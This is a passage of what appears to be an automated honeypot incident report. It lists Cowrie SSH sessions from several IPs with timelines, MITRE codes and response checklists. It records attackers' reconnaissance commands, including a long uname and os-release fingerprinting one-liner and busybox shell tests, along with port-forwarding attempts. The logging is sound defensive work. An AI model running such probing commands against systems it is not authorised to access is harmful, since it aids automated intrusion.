| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:39:06` | `cowrie.session.connect` |
| `2026-07-26 04:39:06` | `cowrie.client.version` |
| `2026-07-26 04:39:06` | `cowrie.client.kex` |
| `2026-07-26 04:39:07` | `cowrie.login.success` |
| `2026-07-26 04:39:08` | `cowrie.session.params` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.success` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:08` | `cowrie.command.input` |
| `2026-07-26 04:39:09` | `cowrie.log.closed` |
| `2026-07-26 04:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70209506292

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:40 |
| **Last Seen** | 2026-07-26 04:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:40:36` | `cowrie.session.connect` |
| `2026-07-26 04:40:37` | `cowrie.client.version` |
| `2026-07-26 04:40:37` | `cowrie.client.kex` |
| `2026-07-26 04:40:38` | `cowrie.login.success` |
| `2026-07-26 04:40:38` | `cowrie.session.params` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.success` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:38` | `cowrie.command.input` |
| `2026-07-26 04:40:39` | `cowrie.log.closed` |
| `2026-07-26 04:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02282361f800

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:42 |
| **Last Seen** | 2026-07-26 04:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:42:12` | `cowrie.session.connect` |
| `2026-07-26 04:42:12` | `cowrie.client.version` |
| `2026-07-26 04:42:12` | `cowrie.client.kex` |
| `2026-07-26 04:42:14` | `cowrie.login.success` |
| `2026-07-26 04:42:15` | `cowrie.session.params` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.success` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.command.input` |
| `2026-07-26 04:42:15` | `cowrie.log.closed` |
| `2026-07-26 04:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-067c4196815d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 04:42 |
| **Last Seen** | 2026-07-26 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:42:34` | `cowrie.session.connect` |
| `2026-07-26 04:42:34` | `cowrie.client.version` |
| `2026-07-26 04:42:35` | `cowrie.client.kex` |
| `2026-07-26 04:42:35` | `cowrie.login.success` |
| `2026-07-26 04:42:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:42:35` | `cowrie.direct-tcpip.data` |
| `2026-07-26 04:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87460453e4cd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]254` |
| **First Seen** | 2026-07-26 04:43 |
| **Last Seen** | 2026-07-26 04:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:43:19` | `cowrie.session.connect` |
| `2026-07-26 04:43:20` | `cowrie.login.success` |
| `2026-07-26 04:43:21` | `cowrie.session.params` |
| `2026-07-26 04:43:21` | `cowrie.command.input` |
| `2026-07-26 04:43:22` | `cowrie.command.input` |
| `2026-07-26 04:43:22` | `cowrie.command.input` |
| `2026-07-26 04:43:23` | `cowrie.command.input` |
| `2026-07-26 04:43:23` | `cowrie.command.failed` |
| `2026-07-26 04:43:24` | `cowrie.log.closed` |
| `2026-07-26 04:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]254` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05fa752cd099

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:43 |
| **Last Seen** | 2026-07-26 04:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:43:54` | `cowrie.session.connect` |
| `2026-07-26 04:43:54` | `cowrie.client.version` |
| `2026-07-26 04:43:54` | `cowrie.client.kex` |
| `2026-07-26 04:43:55` | `cowrie.login.success` |
| `2026-07-26 04:43:56` | `cowrie.session.params` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.success` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.command.input` |
| `2026-07-26 04:43:56` | `cowrie.log.closed` |
| `2026-07-26 04:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c2a18be31c1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:45 |
| **Last Seen** | 2026-07-26 04:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:45:33` | `cowrie.session.connect` |
| `2026-07-26 04:45:33` | `cowrie.client.version` |
| `2026-07-26 04:45:33` | `cowrie.client.kex` |
| `2026-07-26 04:45:34` | `cowrie.login.success` |
| `2026-07-26 04:45:35` | `cowrie.session.params` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.success` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.command.input` |
| `2026-07-26 04:45:35` | `cowrie.log.closed` |
| `2026-07-26 04:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa63c5fbd818

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:47 |
| **Last Seen** | 2026-07-26 04:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:47:12` | `cowrie.session.connect` |
| `2026-07-26 04:47:12` | `cowrie.client.version` |
| `2026-07-26 04:47:12` | `cowrie.client.kex` |
| `2026-07-26 04:47:13` | `cowrie.login.success` |
| `2026-07-26 04:47:13` | `cowrie.session.params` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.success` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:13` | `cowrie.command.input` |
| `2026-07-26 04:47:14` | `cowrie.log.closed` |
| `2026-07-26 04:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31fa14ce373

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:48 |
| **Last Seen** | 2026-07-26 04:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:48:57` | `cowrie.session.connect` |
| `2026-07-26 04:48:57` | `cowrie.client.version` |
| `2026-07-26 04:48:57` | `cowrie.client.kex` |
| `2026-07-26 04:48:58` | `cowrie.login.success` |
| `2026-07-26 04:48:59` | `cowrie.session.params` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.success` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.command.input` |
| `2026-07-26 04:48:59` | `cowrie.log.closed` |
| `2026-07-26 04:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578774a94954

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:50 |
| **Last Seen** | 2026-07-26 04:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:50:41` | `cowrie.session.connect` |
| `2026-07-26 04:50:41` | `cowrie.client.version` |
| `2026-07-26 04:50:41` | `cowrie.client.kex` |
| `2026-07-26 04:50:42` | `cowrie.login.success` |
| `2026-07-26 04:50:43` | `cowrie.session.params` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.success` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.command.input` |
| `2026-07-26 04:50:43` | `cowrie.log.closed` |
| `2026-07-26 04:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6f238493bb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:52 |
| **Last Seen** | 2026-07-26 04:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:52:17` | `cowrie.session.connect` |
| `2026-07-26 04:52:17` | `cowrie.client.version` |
| `2026-07-26 04:52:17` | `cowrie.client.kex` |
| `2026-07-26 04:52:18` | `cowrie.login.success` |
| `2026-07-26 04:52:19` | `cowrie.session.params` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.success` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.command.input` |
| `2026-07-26 04:52:19` | `cowrie.log.closed` |
| `2026-07-26 04:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce9930dcda65

| Field | Detail |
|---|---|
| **Source IP** | `185.81.94[.]58` |
| **First Seen** | 2026-07-26 04:53 |
| **Last Seen** | 2026-07-26 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:53:31` | `cowrie.session.connect` |
| `2026-07-26 04:53:31` | `cowrie.client.version` |
| `2026-07-26 04:53:31` | `cowrie.client.kex` |
| `2026-07-26 04:53:32` | `cowrie.login.success` |
| `2026-07-26 04:53:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.81.94[.]58` to AbuseIPDB if not already reported
- [ ] Block `185.81.94[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710723b154eb

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-26 04:53 |
| **Last Seen** | 2026-07-26 04:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:53:37` | `cowrie.session.connect` |
| `2026-07-26 04:53:38` | `cowrie.client.version` |
| `2026-07-26 04:53:38` | `cowrie.client.kex` |
| `2026-07-26 04:53:40` | `cowrie.login.success` |
| `2026-07-26 04:53:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d5f6a782f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:53 |
| **Last Seen** | 2026-07-26 04:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:53:56` | `cowrie.session.connect` |
| `2026-07-26 04:53:57` | `cowrie.client.version` |
| `2026-07-26 04:53:57` | `cowrie.client.kex` |
| `2026-07-26 04:53:58` | `cowrie.login.success` |
| `2026-07-26 04:53:59` | `cowrie.session.params` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.success` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.command.input` |
| `2026-07-26 04:53:59` | `cowrie.log.closed` |
| `2026-07-26 04:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f7dabbec97

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-26 04:54 |
| **Last Seen** | 2026-07-26 04:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 522, Connection: close, User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

